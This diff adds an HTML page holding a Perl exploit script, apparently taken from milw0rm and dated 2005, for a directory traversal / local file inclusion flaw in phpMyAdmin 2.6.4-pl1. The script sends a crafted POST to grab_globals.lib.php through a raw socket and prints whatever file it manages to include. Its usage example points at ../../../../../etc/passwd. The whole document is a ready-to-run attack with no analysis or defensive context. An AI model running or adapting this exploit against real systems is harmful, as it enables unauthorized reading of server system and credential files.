@@ -1,0 +1,53 @@
+<html><head><title>phpMyAdmin 2.6.4-pl1 Remote Directory Traversal Exploit</title></head><pre>#!/usr/bin/perl
+use IO::Socket;
+
+# SecurityReason.com TEAM
+# Maksymilian Arciemowicz ( cXIb8O3 ) cxib@securtiyreason.com
+#
+# Local file inclusion (./$FILE)
+# simple exploit phpMyAdmin 2.6.4-pl1
+#
+#
+# SecurityReason.com
+
+if (@ARGV &lt; 3)
+{
+print &quot;\r\n SecurityReason TEAM\r\n&quot;;
+print &quot;[cXIb8O3] EXPLOIT for phpMyAdmin 2.6.4-pl1\r\n&quot;;
+print &quot; \r\n&quot;;
+print &quot;perl phpmyadmin-2.6.4-pl1.pl HOST /DIR/ FILE\r\n\r\n&quot;;
+print &quot;HOST - Host where is phpmyadmin example: http://localhost\r\n&quot;;
+print &quot;DIR - Directory to PMA example: /phpMyAdmin-2.6.4-pl1/\r\n&quot;;
+print &quot;FILE - file to inclusion ../../../../../etc/passwd\r\n\r\n&quot;;
+print &quot;example cmd: perl phpmyadmin-2.6.4-pl1.pl http://localhost /phpMyAdmin-2.6.4-pl1/ ../../../../../etc/passwd\r\n\r\n&quot;;
+exit();
+}
+
+$HOST = $ARGV[0];
+$DIR = $ARGV[1].&quot;libraries/grab_globals.lib.php&quot;;
+$FILE = &quot;usesubform[1]=1&amp;usesubform[2]=1&amp;subform[1][redirect]=&quot;.$ARGV[2].&quot;&amp;subform[1][cXIb8O3]=1&quot;;
+$LENGTH = length $FILE;
+
+print &quot;\r\nATTACK HOST IS: &quot;.$HOST.&quot;\r\n\r\n&quot;;
+$HOST =~ s/(http:\/\/)//;
+
+$get1 = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$HOST&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;Error 404\r\n\r\n&quot;;
+
+print $get1 &quot;POST &quot;.$DIR.&quot; HTTP/1.0\n&quot;;
+print $get1 &quot;Host: &quot;.$HOST.&quot;\n&quot;;
+print $get1 &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
+print $get1 &quot;Content-Length: &quot;.$LENGTH.&quot;\n\n&quot;;
+
+print $get1 $FILE;
+
+while ($odp = &lt;$get1&gt;)
+{
+if ($odp =~ /&lt;b&gt;Warning&lt;\/b&gt;: main\(\): Unable to access .\/$ARGV[2] in &lt;b&gt;/ ) {
+printf &quot;\n\nFile &quot;.$ARGV[2].&quot; no exists.\r\n\r\n&quot;;
+exit;
+}
+
+printf $odp;
+}
+
+# milw0rm.com [2005-10-10]</pre></html>
